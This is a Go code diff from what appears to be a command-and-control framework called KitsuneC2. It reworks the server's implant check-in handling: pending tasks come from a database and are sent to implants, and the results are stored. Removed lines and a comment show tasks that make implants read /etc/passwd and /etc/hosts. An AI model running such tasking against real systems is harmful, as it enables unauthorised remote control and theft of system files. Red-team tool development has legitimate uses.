@@ -6,7 +6,6 @@ import (
 	"KitsuneC2/lib/communication"
 	"KitsuneC2/server/db"
 	"encoding/json"
-	"fmt"
 	"log"
 	"net"
 	"time"
@@ -68,11 +67,14 @@ func handleImplantRegister(sess *session, data interface{}) {
 // Handles envelopes with messageType==1. Every x amount of time, an implant sends a check-in message which this function handles.
 // the "data" variable is a string with the ID of an implant.
 func handleCheckin(sess *session, data interface{}) {
-	//EXAMPLE: If we receive the folowing data: {}
 	implantCheckin, ok := data.(*communication.ImplantCheckinReq)
 	if !ok {
 		log.Printf("[ERROR] Received envelope with messageType=1 (Checkin), but could not convert envelope data to Checkin datastructure")
 		return
+	}
+	err := db.UpdateLastCheckin(implantCheckin.ImplantId, int(time.Now().Unix()))
+	if err != nil {
+		log.Printf("[ERROR] could not update last checkin time of Implant with id: %s. Reason: %s", implantCheckin.ImplantId, err.Error())
 	}
 	log.Printf("[INFO] Handling check-in from implant with ID: %s", implantCheckin.ImplantId)
 
@@ -84,15 +86,24 @@ func handleCheckin(sess *session, data interface{}) {
 	//necessary arguments {PathToFile: "/etc/passwd"} and {PathToFile: "/etc/passwd"} and its corresponding MessageType (11, 11).
 	//The ImplantCheckinResp object will look as follows: {[11, 11], [0][json.Marshal(FileInfoReq1)]}
 	//														.....	 [1][json.Marhsal(FileInfoReq2)]
+	pendingTasks, err := db.GetTasks(implantCheckin.ImplantId, false)
+	if err != nil {
+		if err == db.ErrNoResults {
+			log.Printf("[INFO] no pending tasks for implant with id: %s", implantCheckin.ImplantId)
+		} else {
+			log.Printf("[ERROR] Database error while fetching tasks for implant with id: %s. Reason: %s", implantCheckin.ImplantId, err.Error())
+		}
+		return
+	}
 	req := new(communication.ImplantCheckinResp)
-	req.TaskIds = make([]int, 2)
-	req.TaskArguments = make([][]byte, 2)
-	task1, _ := json.Marshal(communication.FileInfoReq{PathToFile: "/etc/passwd"})
-	task2, _ := json.Marshal(communication.FileInfoReq{PathToFile: "/etc/hosts"})
-	req.TaskIds[0] = 11
-	req.TaskIds[1] = 11
-	req.TaskArguments[0] = task1
-	req.TaskArguments[1] = task2
+	req.TaskTypes = make([]int, len(pendingTasks))
+	req.TaskArguments = make([][]byte, len(pendingTasks))
+	for i := range pendingTasks {
+		log.Printf("[INFO] Sending task with ID: %s to implant with ID: %s", pendingTasks[i].Task_id, implantCheckin.ImplantId)
+		req.TaskTypes[i] = pendingTasks[i].Task_type
+		req.TaskArguments[i] = []byte(pendingTasks[i].Task_data)
+	}
+
 	SendEnvelopeToImplant(sess, 2, req)
 }
 
@@ -103,5 +114,12 @@ func handleFileInfoResp(sess *session, data interface{}) {
 		log.Printf("[ERROR] Received envelope with messageType=2 (FileInfoResp), but could not convert envelope data to FileInfoResp datastructure")
 		return
 	}
-	fmt.Printf("name: %s\nsize: %d\nmode: %s\nmodTime: %d\nisDir: %t", fileInfoResp.Name, fileInfoResp.Size, fileInfoResp.Mode, fileInfoResp.ModTime, fileInfoResp.IsDir)
+	marshalledRes, err := json.Marshal(fileInfoResp)
+	if err != nil {
+		log.Printf("[ERROR] Unable to marshal result of task with ID: %s for storage in database. Reason: %s", fileInfoResp.TaskId, err.Error())
+	}
+	err = db.CompleteTask(fileInfoResp.TaskId, marshalledRes)
+	if err != nil {
+		log.Printf("[ERROR] Unable to store result of completed task with ID: %s. Reason: %s", fileInfoResp.TaskId, err.Error())
+	}
 }
